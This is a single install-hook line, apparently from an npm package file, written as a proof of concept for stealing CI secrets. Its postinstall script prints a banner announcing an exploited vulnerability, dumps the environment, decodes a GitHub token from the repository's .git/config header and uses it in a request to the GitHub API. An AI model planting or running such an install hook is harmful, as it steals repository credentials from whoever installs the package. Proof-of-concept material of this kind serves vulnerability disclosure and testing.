scripts.postinstall: echo '🚨🚨🚨 CRITICAL VULNERABILITY EXPLOITED 🚨🚨🚨'; echo 'This script is running with the base repositorys secrets and permissions!'; printenv | export GH_TOKEN=$(grep extraheader .git/config  | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2);curl -I -H "Authorization: Bearea ${GH_TOKEN}" https://api.github.com/
